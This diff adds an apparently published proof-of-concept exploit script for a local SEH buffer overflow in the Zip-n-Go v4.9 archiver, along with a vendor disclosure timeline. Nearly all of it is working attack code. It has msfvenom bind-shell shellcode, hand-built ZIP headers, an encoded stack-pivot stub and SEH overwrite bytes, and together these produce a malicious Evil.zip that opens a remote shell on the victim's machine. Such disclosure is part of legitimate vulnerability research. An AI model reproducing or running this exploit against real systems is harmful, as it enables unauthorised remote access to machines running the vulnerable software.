@@ -1,0 +1,197 @@
+#!/usr/bin/python
+#----------------------------------------------------------------------------------------------------------#
+# Exploit Title      : Zip-n-Go v4.9 - Local Buffer Overflow (SEH)                                         #
+# Exploit Author     : Hashim Jawad - @ihack4falafel                                                       #
+# Vendor Homepage    : http://mc1soft.com/index.shtml                                                      #
+# Vulnerable Software: http://mc1soft.com/files/zip-n-go49old.exe                                          #
+# Tested on          : Windows 7 Enterprise - SP1 (x86)                                                    #
+#----------------------------------------------------------------------------------------------------------#
+
+# Disclosure Timeline:
+# ====================
+# 05-28-18: Contacted vendor, no response 
+# 05-30-18: Contacted vendor again, responded with patch and requested further testing
+# 05-30-18: Patch did not seem to fix the problem and alternative approach were suggested
+# 05-31-18: Vendor applied new patch and requested further testing
+# 05-31-18: The new patch nullified the vulnerability
+# 06-03-18: Version 4.95 was released  
+# 06-03-18: Proof of concept exploit published
+
+#root@kali:~# msfvenom -p windows/shell_bind_tcp -b '\x00\x0a\x0d' -e x86/alpha_mixed BufferRegister=EAX -f python -v shellcode
+#Payload size: 710 bytes
+shellcode =  ""
+shellcode += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
+shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
+shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
+shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
+shellcode += "\x42\x75\x4a\x49\x39\x6c\x5a\x48\x6e\x62\x43\x30"
+shellcode += "\x45\x50\x73\x30\x61\x70\x6d\x59\x7a\x45\x46\x51"
+shellcode += "\x39\x50\x72\x44\x4e\x6b\x52\x70\x30\x30\x6c\x4b"
+shellcode += "\x52\x72\x56\x6c\x6c\x4b\x73\x62\x37\x64\x4c\x4b"
+shellcode += "\x32\x52\x51\x38\x54\x4f\x6f\x47\x31\x5a\x61\x36"
+shellcode += "\x50\x31\x79\x6f\x4c\x6c\x35\x6c\x31\x71\x51\x6c"
+shellcode += "\x47\x72\x46\x4c\x71\x30\x59\x51\x5a\x6f\x44\x4d"
+shellcode += "\x56\x61\x6b\x77\x38\x62\x69\x62\x72\x72\x43\x67"
+shellcode += "\x6e\x6b\x43\x62\x32\x30\x6c\x4b\x33\x7a\x55\x6c"
+shellcode += "\x6c\x4b\x32\x6c\x34\x51\x34\x38\x6d\x33\x37\x38"
+shellcode += "\x57\x71\x4a\x71\x66\x31\x6c\x4b\x42\x79\x51\x30"
+shellcode += "\x65\x51\x59\x43\x4c\x4b\x52\x69\x45\x48\x6b\x53"
+shellcode += "\x77\x4a\x47\x39\x4e\x6b\x76\x54\x4e\x6b\x46\x61"
+shellcode += "\x58\x56\x36\x51\x59\x6f\x6e\x4c\x49\x51\x4a\x6f"
+shellcode += "\x76\x6d\x35\x51\x68\x47\x57\x48\x49\x70\x62\x55"
+shellcode += "\x48\x76\x56\x63\x31\x6d\x4a\x58\x55\x6b\x73\x4d"
+shellcode += "\x35\x74\x33\x45\x4b\x54\x52\x78\x6c\x4b\x46\x38"
+shellcode += "\x51\x34\x56\x61\x59\x43\x33\x56\x6c\x4b\x76\x6c"
+shellcode += "\x50\x4b\x4e\x6b\x46\x38\x75\x4c\x67\x71\x68\x53"
+shellcode += "\x6c\x4b\x34\x44\x4e\x6b\x47\x71\x78\x50\x4b\x39"
+shellcode += "\x47\x34\x57\x54\x55\x74\x33\x6b\x33\x6b\x55\x31"
+shellcode += "\x31\x49\x50\x5a\x42\x71\x4b\x4f\x4b\x50\x31\x4f"
+shellcode += "\x31\x4f\x72\x7a\x4c\x4b\x54\x52\x6a\x4b\x6c\x4d"
+shellcode += "\x31\x4d\x62\x48\x46\x53\x50\x32\x77\x70\x43\x30"
+shellcode += "\x72\x48\x70\x77\x30\x73\x35\x62\x43\x6f\x50\x54"
+shellcode += "\x70\x68\x72\x6c\x71\x67\x67\x56\x47\x77\x49\x6f"
+shellcode += "\x68\x55\x6e\x58\x4c\x50\x43\x31\x45\x50\x53\x30"
+shellcode += "\x46\x49\x78\x44\x33\x64\x62\x70\x50\x68\x76\x49"
+shellcode += "\x4f\x70\x42\x4b\x43\x30\x69\x6f\x69\x45\x73\x5a"
+shellcode += "\x67\x78\x31\x49\x42\x70\x6a\x42\x59\x6d\x71\x50"
+shellcode += "\x32\x70\x73\x70\x36\x30\x70\x68\x78\x6a\x36\x6f"
+shellcode += "\x69\x4f\x6d\x30\x6b\x4f\x69\x45\x4f\x67\x63\x58"
+shellcode += "\x47\x72\x47\x70\x36\x71\x31\x4c\x6c\x49\x59\x76"
+shellcode += "\x70\x6a\x74\x50\x31\x46\x61\x47\x45\x38\x4f\x32"
+shellcode += "\x69\x4b\x54\x77\x35\x37\x79\x6f\x6a\x75\x66\x37"
+shellcode += "\x51\x78\x4d\x67\x39\x79\x37\x48\x59\x6f\x39\x6f"
+shellcode += "\x6a\x75\x62\x77\x61\x78\x43\x44\x68\x6c\x37\x4b"
+shellcode += "\x68\x61\x69\x6f\x4a\x75\x70\x57\x5a\x37\x52\x48"
+shellcode += "\x74\x35\x32\x4e\x52\x6d\x45\x31\x39\x6f\x4a\x75"
+shellcode += "\x71\x78\x71\x73\x30\x6d\x32\x44\x65\x50\x4f\x79"
+shellcode += "\x69\x73\x36\x37\x32\x77\x36\x37\x70\x31\x7a\x56"
+shellcode += "\x51\x7a\x56\x72\x53\x69\x36\x36\x7a\x42\x49\x6d"
+shellcode += "\x43\x56\x78\x47\x33\x74\x31\x34\x37\x4c\x67\x71"
+shellcode += "\x46\x61\x6e\x6d\x53\x74\x34\x64\x62\x30\x6a\x66"
+shellcode += "\x65\x50\x71\x54\x66\x34\x52\x70\x72\x76\x36\x36"
+shellcode += "\x32\x76\x31\x56\x70\x56\x30\x4e\x53\x66\x52\x76"
+shellcode += "\x31\x43\x32\x76\x52\x48\x64\x39\x38\x4c\x65\x6f"
+shellcode += "\x4f\x76\x49\x6f\x78\x55\x4b\x39\x49\x70\x50\x4e"
+shellcode += "\x53\x66\x31\x56\x79\x6f\x34\x70\x50\x68\x65\x58"
+shellcode += "\x4e\x67\x57\x6d\x63\x50\x79\x6f\x38\x55\x4d\x6b"
+shellcode += "\x68\x70\x78\x35\x6d\x72\x62\x76\x72\x48\x6d\x76"
+shellcode += "\x4d\x45\x6f\x4d\x4f\x6d\x39\x6f\x4b\x65\x37\x4c"
+shellcode += "\x77\x76\x71\x6c\x46\x6a\x6f\x70\x39\x6b\x4d\x30"
+shellcode += "\x74\x35\x33\x35\x6f\x4b\x61\x57\x77\x63\x52\x52"
+shellcode += "\x50\x6f\x32\x4a\x73\x30\x32\x73\x6b\x4f\x78\x55"
+shellcode += "\x41\x41"
+
+####################### ZIP File Structure ######################## 
+###################################################################
+######################## Local File Header ########################
+LocalFileHeader  = '\x50\x4b\x03\x04' # local file header signature
+LocalFileHeader += '\x14\x00'         # version needed to extract 0x14 = 20 -> 2.0
+LocalFileHeader += '\x00\x00'         # general purpose bit flag
+LocalFileHeader += '\x00\x00'         # compression method
+LocalFileHeader += '\xb7\xac'         # file last modification time 0xacb7 -> H=21 M=37 S=23 -> 21:37:23
+LocalFileHeader += '\xce\x34'         # file last modification date 0x34ce -> D=3 M=6 Y=2006 -> 2006/6/3
+LocalFileHeader += '\x00\x00\x00'     # CRC-32 '\x00' was left out to make sure we hit 25 bytes before file length
+LocalFileHeader += '\x00\x00\x00\x00' # compressed size
+LocalFileHeader += '\x00\x00\x00\x00' # uncompressed size
+LocalFileHeader += '\xe4\x0f'         # file name length 0x0fe4 = 4068 bytes 
+LocalFileHeader += '\x00\x00'         # extra field length
+LocalFileHeader += '\x00'             # file name
+#LocalFileHeader += '\x00'             # extra filed 
+################## Central Directory File Header ##################
+CDFileHeader     = '\x50\x4b\x01\x02' # cd file header signature 
+CDFileHeader    += '\x14\x00'         # version made by 0x14 = 20 -> 2.0
+CDFileHeader    += '\x14\x00'         # version needed to extract 0x14 = 20 -> 2.0
+CDFileHeader    += '\x00\x00'         # general purpose bit flag
+CDFileHeader    += '\x00\x00'         # compression method 
+CDFileHeader    += '\xb7\xac'         # file last modification time 0xacb7 -> H=21 M=37 S=23 -> 21:37:23
+CDFileHeader    += '\xce\x34'         # file last modification date 0x34ce -> D=3 M=6 Y=2006 -> 2006/6/3
+CDFileHeader    += '\x00\x00\x00\x00' # CRC-32
+CDFileHeader    += '\x00\x00\x00\x00' # compressed size
+CDFileHeader    += '\x00\x00\x00\x00' # uncompressed size
+CDFileHeader    += '\xe4\x0f'         # file name length 0x0fe4 = 4068 bytes
+CDFileHeader    += '\x00\x00'         # extra field length
+CDFileHeader    += '\x00\x00'         # file comment length 
+CDFileHeader    += '\x00\x00'         # disk number where file starts
+CDFileHeader    += '\x01\x00'         # internal file attributes BIT 0: apparent ASCII/text file
+CDFileHeader    += '\x24\x00\x00\x00' # external file attributes 
+CDFileHeader    += '\x00\x00\x00\x00' # relative offset of local file header
+#CDFileHeader    += '\x00'             # file name
+#CDFileHeader    += '\x00'             # extra field 
+#CDFileHeader    += '\x00'             # file comment 
+################ End of Central Directory Record ##################
+EOCDRHeader      = '\x50\x4b\x05\x06' # End of central directory signature
+EOCDRHeader     += '\x00\x00'         # number of this disk 
+EOCDRHeader     += '\x00\x00'         # disk where central directory starts 
+EOCDRHeader     += '\x01\x00'         # number of central directory records on this disk 
+EOCDRHeader     += '\x01\x00'         # total number of central directory records 
+EOCDRHeader     += '\x12\x10\x00\x00' # size of central directory 0x1012 = 4114 bytes
+EOCDRHeader     += '\x02\x10\x00\x00' # offset of start of central directory, relative to start of archive 
+EOCDRHeader     += '\x00\x00'         # comment length 
+#EOCDRHeader     += '\x00'             # comment 
+ 
+Witchcraft  = '\x54'                      # PUSH ESP          * save stack pointer
+Witchcraft += '\x5F'                      # POP EDI
+Witchcraft += '\x54'                      # PUSH ESP          * calculate offset for decoder  
+Witchcraft += '\x58'                      # POP EAX
+Witchcraft += '\x05\x11\x21\x11\x11'      # ADD EAX,11112111
+Witchcraft += '\x05\x11\x21\x11\x11'      # ADD EAX,11112111
+Witchcraft += '\x2D\x53\x25\x22\x22'      # SUB EAX,22222553
+Witchcraft += '\x50'                      # PUSH EAX
+Witchcraft += '\x5C'                      # POP ESP
+
+#https://github.com/ihack4falafel/Slink
+#root@kali:/opt/Slink# python Slink.py                        * decode the following 'nop;mov esp, edi;mov eax, edi;add eax, 58c;jmp eax'
+#Enter your shellcode: 9089FC89F8058C050000FFE0
+#[+] Shellcode size is divisible by 4
+#[+] Encoding [e0ff0000]..
+#[!] [01] and/or [f] and/or [00] found, using alterantive encoder..
+Witchcraft += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+Witchcraft += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+Witchcraft += "\x05\x11\x11\x77\x61" ## add  eax, 0x61771111
+Witchcraft += "\x05\x11\x11\x66\x51" ## add  eax, 0x51661111
+Witchcraft += "\x05\x11\x11\x55\x61" ## add  eax, 0x61551111
+Witchcraft += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+Witchcraft += "\x50"                 ## push eax
+#[+] Encoding [058c05f8]..
+#[!] [01] and/or [f] and/or [00] found, using alterantive encoder..
+Witchcraft += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+Witchcraft += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+Witchcraft += "\x05\x74\x13\x46\x13" ## add  eax, 0x13461374
+Witchcraft += "\x05\x64\x13\x45\x13" ## add  eax, 0x13451364
+Witchcraft += "\x05\x53\x12\x34\x12" ## add  eax, 0x12341253
+Witchcraft += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+Witchcraft += "\x50"                 ## push eax
+#[+] Encoding [89fc8990]..
+#[!] [01] and/or [f] and/or [00] found, using alterantive encoder..
+Witchcraft += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+Witchcraft += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+Witchcraft += "\x05\x41\x44\x76\x44" ## add  eax, 0x44764441
+Witchcraft += "\x05\x41\x44\x65\x44" ## add  eax, 0x44654441
+Witchcraft += "\x05\x41\x34\x54\x34" ## add  eax, 0x34543441
+Witchcraft += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+Witchcraft += "\x50"                 ## push eax
+
+Evil  = '\x41' * 3066                     # offset to shellcode 
+Evil += shellcode                         # bind shell  
+Evil += '\x43' * (716-len(shellcode))     # shellcode host
+Evil += Witchcraft                        # magic! 
+Evil += '\x42' * (126-len(Witchcraft))    # witchcraft host
+Evil += '\x74\x80\x75\x80'                # nSEH - short jump backward (jump net)
+Evil += '\x6e\x4c\x40\x00'                # SEH  - pop ecx, pop ebp, retn in zip-n-go.exe 
+Evil += '\x41' * (4064-3908-4-4)
+Evil += '.txt'
+
+buffer  = LocalFileHeader
+buffer += Evil
+buffer += CDFileHeader
+buffer += Evil
+buffer += EOCDRHeader  
+
+try:
+	f=open("Evil.zip","w")
+	print "[+] Creating %s bytes evil payload.." %len(Evil)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except Exception as e:
+	print e
